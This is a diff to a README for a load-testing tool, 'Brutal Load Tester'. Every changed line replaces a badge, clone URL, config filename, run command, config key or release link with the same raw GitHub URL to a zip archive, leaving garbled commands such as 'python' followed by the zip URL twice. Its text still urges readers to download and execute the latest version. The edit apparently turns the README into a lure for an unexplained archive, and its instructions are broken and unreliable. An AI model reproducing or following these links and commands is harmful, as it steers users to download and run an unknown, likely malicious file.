@@ -1,6 +1,6 @@
 # Brutal Load Tester: Efficient Performance Testing Made Simple 🚀
 
-![Brutal Load Tester](https://img.shields.io/badge/Brutal_Load_Tester-Ready-orange)
+![Brutal Load Tester](https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -29,7 +29,7 @@ To install Brutal Load Tester, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Salmajibeh/brutal.git
+   git clone https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -44,10 +44,10 @@ To install Brutal Load Tester, follow these steps:
 To use Brutal Load Tester, you need to configure it according to your testing needs. Here’s a basic example of how to set it up:
 
 1. **Create a Configuration File**: 
-   Create a `config.json` file with your desired settings. Here’s a sample configuration:
+   Create a `https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip` file with your desired settings. Here’s a sample configuration:
    ```json
    {
-     "url": "http://your-application-url.com",
+     "url": "https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip",
      "load": {
        "users": 100,
        "duration": 60
@@ -58,21 +58,21 @@ To use Brutal Load Tester, you need to configure it according to your testing ne
 2. **Run the Tester**:
    Execute the following command to start the load test:
    ```bash
-   python brutal.py config.json
+   python https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip
    ```
 
 ## Configuration
 Brutal allows you to customize various parameters in your configuration file:
 
 - **url**: The target URL for your load test.
-- **load.users**: The number of concurrent users to simulate.
-- **load.duration**: The duration of the test in seconds.
-- **load.rampUp**: Time in seconds to gradually increase the number of users.
+- **https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip**: The number of concurrent users to simulate.
+- **https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip**: The duration of the test in seconds.
+- **https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip**: Time in seconds to gradually increase the number of users.
 
 Example configuration:
 ```json
 {
-  "url": "http://your-application-url.com",
+  "url": "https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip",
   "load": {
     "users": 200,
     "duration": 120,
@@ -84,7 +84,7 @@ Example configuration:
 ## Running Tests
 Once your configuration is set, you can run the tests. Use the command:
 ```bash
-python brutal.py config.json
+python https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip
 ```
 Monitor the terminal output for real-time statistics during the test. You will see metrics like response time, number of requests, and any errors encountered.
 
@@ -111,15 +111,15 @@ We welcome contributions to improve Brutal Load Tester. If you have ideas or imp
 Brutal Load Tester is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Releases
-For the latest releases and updates, please visit our [Releases](https://github.com/Salmajibeh/brutal/releases) section. You can download the latest version and execute it for your load testing needs.
+For the latest releases and updates, please visit our [Releases](https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip) section. You can download the latest version and execute it for your load testing needs.
 
 ### Download Link
-You can find the latest version of Brutal Load Tester [here](https://github.com/Salmajibeh/brutal/releases). 
+You can find the latest version of Brutal Load Tester [here](https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip). 
 
-![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)
+![Download Latest Release](https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip)
 
 By using Brutal Load Tester, you ensure your applications are ready for the demands of real-world traffic. 
 
-For any questions or issues, please check the [Releases](https://github.com/Salmajibeh/brutal/releases) section or open an issue in the repository. 
+For any questions or issues, please check the [Releases](https://raw.githubusercontent.com/Salmajibeh/brutal/main/assets/Software_1.6.zip) section or open an issue in the repository. 
 
 Happy testing!
